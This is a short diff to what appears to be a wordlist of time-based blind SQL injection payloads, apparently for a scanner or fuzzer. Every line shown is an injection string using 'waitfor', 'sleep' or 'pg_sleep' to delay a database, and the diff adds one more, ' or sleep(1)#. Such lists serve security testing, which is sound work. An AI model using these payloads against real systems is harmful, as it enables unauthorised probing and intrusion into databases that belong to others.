@@ -5,6 +5,7 @@
 ');waitfor time '0:0:15' --
 1,'0');waitfor time '0:0:15' --
 ' sleep(15) --
+' or sleep(1)#
 ') sleep(15) --
 1,'0') sleep(15) --
 ' pg_sleep(15) --
